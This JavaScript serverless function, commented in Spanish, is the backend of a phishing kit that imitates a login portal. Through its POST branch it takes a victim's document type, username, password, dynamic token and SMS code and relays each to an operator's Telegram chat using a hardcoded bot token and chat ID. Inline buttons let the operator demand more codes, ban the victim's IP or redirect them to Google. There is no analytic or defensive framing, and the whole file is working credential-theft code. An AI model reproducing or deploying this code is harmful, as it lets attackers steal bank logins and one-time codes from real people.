// api/send.js
export default async function handler(req, res) {
  // Configurar CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // ⚠️ VERIFICA QUE ESTOS DATOS SEAN CORRECTOS
  const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
  const TG_CHAT_ID = '7776240161';

  // 1. ESCUCHAR RESPUESTAS DE LOS BOTONES (GET)
  if (req.method === 'GET') {
    const { offset } = req.query;
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=${offset || -1}&allowed_updates=["callback_query"]`;
    
    try {
      const response = await fetch(url);
      const data = await response.json();
      return res.status(200).json(data);
    } catch (error) {
      return res.status(500).json({ ok: false, error: "Error en GET a Telegram", details: error.message });
    }
  }

  // 2. ENVIAR MENSAJES (POST)
  if (req.method === 'POST') {
    const { tipoDoc, usuario, clave, dynamicCode, smsCode, action } = req.body;
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;

    let mensaje = '';
    let keyboard = { inline_keyboard: [] };

    if (action === 'login') {
      mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n📄 <b>Tipo doc:</b> <code>${tipoDoc}</code>\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
      keyboard = {
        inline_keyboard: [
          [{ text: '❌ Usuario Malo', callback_data: 'error_usuario' }, { text: '🔑 Pedir Token', callback_data: 'pedir_dinamica' }],
          [{ text: '🚫 Banear IP', callback_data: 'banear_ip' }, { text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
        ]
      };
    } else if (action === 'dinamica') {
      mensaje = `⚡ <b>PORTAL - TOKEN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔢 <b>Token:</b> <code>${dynamicCode}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
      keyboard = {
        inline_keyboard: [
          [{ text: '❌ Error Token', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
          [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
        ]
      };
    } else if (action === 'sms') {
      mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n📩 <b>SMS:</b> <code>${smsCode}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
      keyboard = {
        inline_keyboard: [
          [{ text: '❌ Error Token', callback_data: 'error_dinamica_final' }],
          [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
          [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
        ]
      };
    }

    try {
      const tgResponse = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TG_CHAT_ID,
          text: mensaje,
          parse_mode: 'HTML',
          reply_markup: keyboard
        })
      });

      const data = await tgResponse.json();
      return res.status(200).json(data);
    } catch (error) {
      return res.status(500).json({ ok: false, error: "Error en POST a Telegram", details: error.message });
    }
  }

  return res.status(405).json({ ok: false, error: 'Método no permitido' });
}
